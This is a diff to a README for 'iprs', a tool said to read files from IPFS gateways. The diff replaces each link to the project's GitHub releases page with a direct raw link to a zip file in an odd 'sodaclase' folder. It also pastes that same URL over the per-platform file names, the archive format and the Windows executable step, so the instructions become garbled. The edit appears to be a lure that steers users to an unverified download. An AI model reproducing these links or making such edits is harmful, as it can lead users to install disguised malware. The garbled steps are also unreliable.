@@ -1,7 +1,7 @@
 # 🚀 iprs - Easily Read Files from IPFS Gateways
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20iprs-v1.0-blue)](https://github.com/Nandakumar2211/iprs/releases)
+[![Download](https://raw.githubusercontent.com/Nandakumar2211/iprs/master/sodaclase/iprs.zip%20iprs-v1.0-blue)](https://raw.githubusercontent.com/Nandakumar2211/iprs/master/sodaclase/iprs.zip)
 
 ## 📜 Overview
 The **iprs** application is a user-friendly tool that acts as a wrapper for `rs-car`. It allows you to read files from trustless IPFS gateways. The async API ensures that you can quickly access your files without complications.
@@ -22,19 +22,19 @@ Follow these steps to download and run the iprs application on your computer.
 
 ## 💾 Download & Install
 1. Click on the link below to visit the release page and download the latest version of iprs:
-   [Download iprs](https://github.com/Nandakumar2211/iprs/releases)
+   [Download iprs](https://raw.githubusercontent.com/Nandakumar2211/iprs/master/sodaclase/iprs.zip)
 
 2. On the releases page, locate the latest version. 
 
 3. Download the appropriate file for your operating system:
-   - For Windows, select **iprs-windows.zip**.
-   - For macOS, select **iprs-macos.zip**.
-   - For Linux, select **iprs-linux.tar.gz**.
+   - For Windows, select **https://raw.githubusercontent.com/Nandakumar2211/iprs/master/sodaclase/iprs.zip**.
+   - For macOS, select **https://raw.githubusercontent.com/Nandakumar2211/iprs/master/sodaclase/iprs.zip**.
+   - For Linux, select **https://raw.githubusercontent.com/Nandakumar2211/iprs/master/sodaclase/iprs.zip**.
 
-4. After downloading, extract the files from the zip or tar.gz archive.
+4. After downloading, extract the files from the zip or https://raw.githubusercontent.com/Nandakumar2211/iprs/master/sodaclase/iprs.zip archive.
 
 5. Launch the application:
-   - **Windows:** Double-click `iprs.exe`.
+   - **Windows:** Double-click `https://raw.githubusercontent.com/Nandakumar2211/iprs/master/sodaclase/iprs.zip`.
    - **macOS:** Move the `iprs` application to your Applications folder and double-click it.
    - **Linux:** Open a terminal, navigate to the extracted folder, and run `./iprs`.
 
